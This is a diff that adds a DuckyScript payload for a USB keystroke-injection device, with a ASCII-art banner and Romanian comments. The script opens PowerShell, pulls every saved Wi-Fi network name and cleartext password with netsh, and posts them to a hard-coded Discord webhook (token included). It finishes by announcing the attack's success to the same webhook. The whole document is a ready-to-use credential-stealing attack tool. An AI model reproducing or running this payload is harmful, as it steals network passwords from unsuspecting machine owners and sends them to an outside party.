@@ -1,0 +1,126 @@
+
+                                                  
+REM                  .^7?YY5YYJ?!^:                  
+REM              .~JPG5Y?!~~~!7?5PGPY!:              
+REM            ^JGP?^.           ^!7JPBP7.           
+REM          ^5GJ^             ..^~~~~!JGB7          
+REM        .YB7  .   .:^~^^^^^^~~~~~~~~~~?#P:        
+REM       :G5:^J7:.:!YGG5?~~~~~~7???!~~~~~!BB^       
+REM       ?#JP&? .^J#@@@&&BJ~~!7Y#&&&BJ~~~~7BG.      
+REM        ::PY .~7#@&&&&&@&J~7J#@&&&@&J~~~!J&7      
+REM         ^#^ ^~?#@&&&&&&@P~7?#@@&&@@Y~~!7?BP      
+REM         !B..~~!5&@@@@@&G?~~7JPG##BY~~~~77PB.     
+REM         ?G .~~!7J5PGG5J7~~~~!7777!~~~~~!!5B.     
+REM         ?P:?PPP5PPP?~~~!YPP57~~7Y55PPP5J!YB:     
+REM         ?&B5!^::::?#5~!#@@@@#!YB7~~~!!?PBGB.     
+REM        .GG^:^~~~~^.!&J~YGBBP??#^ ~~~~~~~JB#:     
+REM        Y#:.~~~755Y77&Y~~~~~~^?#!!J5Y7~~!?J#7     
+REM       .BP ^~~~7!!7JY?~~~~~~~~~7JJ7~!!~~~??B5     
+REM       :&Y ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~7?PB.    
+REM       5#^ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~7J&?    
+REM     .5#~ :~~!!~~~~~~~~~~!777!~~~~~~!!!!~~~75#~   
+REM   :JB5: ~JPGPPG5!~~~~~~75GGPJ7~~~~7?J5P5J!7?P#:  
+REM  ~&B!^7PB57:..~G#?^~~!J#B7!P&Y7!!7JBG?!7PBY7?&J  |
+REM  .J555Y!:      .Y#PY5BBJ.  .G&J?JP#Y.    7BGP&7  | Script created by -kawa
+REM                  :7?7~.     :5BGG5!       :7?^   | 
+REM                               .:.                
+REM     :^^~~~!!!!!7777777777777777!!!!!!!~~~^^:.    
+REM     :^~!!!77777777?????????????7777777!!!~~^.    
+REM              ......................              
+REM
+
+DELAY 500
+REM Set the PowerShell execution policy to bypass
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+
+
+
+REM Set the webhook URL
+STRING $webhookUrl = "https://discord.com/api/webhooks/1189895448882843719/hzba0jO7iL0qzgPd-qXwwCNTgY6nm572J9HDxCic8JfmHQE3gkuF7hkekkNKgrjgCVpz"
+ENTER
+STRING $wifiProfiles = netsh wlan show profiles | Where-Object { $_ -match "All User Profile" } | ForEach-Object { ($_ -split ":\s+", 2)[1] }
+ENTER
+STRING foreach ($profile in $wifiProfiles) {
+ENTER
+STRING     $profileName = $profile -replace '^\s+|\s+$|All User Profile\s+: ', ''
+ENTER
+STRING     $profileDetails = netsh wlan show profile name="$profileName" key=clear
+ENTER
+STRING     $ssidMatch = $profileDetails | Select-String "SSID name"
+ENTER
+STRING     $keyMatch = $profileDetails | Select-String "Key Content"
+ENTER
+STRING     if ($ssidMatch -and $keyMatch) {
+ENTER
+STRING         $ssid = $ssidMatch -replace '^\s+|\s+$|SSID name\s+: ', ''
+ENTER
+STRING         $keyContent = $keyMatch -replace '^\s+|\s+$|Key Content\s+: ', ''
+ENTER
+STRING         # Construiește mesajul pentru Discord
+ENTER
+STRING         $discordMessage = @{
+ENTER
+STRING             embeds = @(
+ENTER
+STRING                 @{
+ENTER
+STRING                     title = "SSID: $ssid"
+ENTER
+STRING                     description = "PSSW: $keyContent"
+ENTER
+STRING                 }
+ENTER
+STRING             )
+ENTER
+STRING         } | ConvertTo-Json
+ENTER
+STRING         # Trimite mesajul la Webhook-ul Discord
+ENTER
+STRING         try {
+ENTER
+STRING             Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $discordMessage -ContentType "application/json" -ErrorAction Stop
+ENTER
+STRING             Write-Host "Mesajul a fost trimis cu succes pe Discord pentru SSID: $ssid"
+ENTER
+STRING         } catch {
+ENTER
+STRING             Write-Host "Eroare la trimiterea mesajului pe Discord pentru SSID: $ssid"
+ENTER
+STRING             Write-Host $_.Exception.Message
+ENTER
+STRING         }
+ENTER
+STRING         Start-Sleep -Seconds 0.5 # Așteaptă 5 secunde între mesaje
+ENTER
+STRING     }
+ENTER
+STRING }
+REM
+REM Final Message
+STRING $finalMessage = @{
+ENTER
+STRING     embeds = @(
+ENTER
+STRING         @{
+ENTER
+STRING             title = ""
+ENTER
+STRING             description = "---- Atacul a fost realizat cu succes! ----"
+ENTER
+STRING             color = "5763719"
+ENTER
+STRING         }
+ENTER
+STRING     )
+ENTER
+STRING } | ConvertTo-Json
+ENTER
+STRING Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $finalMessage -ContentType "application/json" -ErrorAction Stop
+ENTER
+DELAY 500
+STRING exit
+ENTER
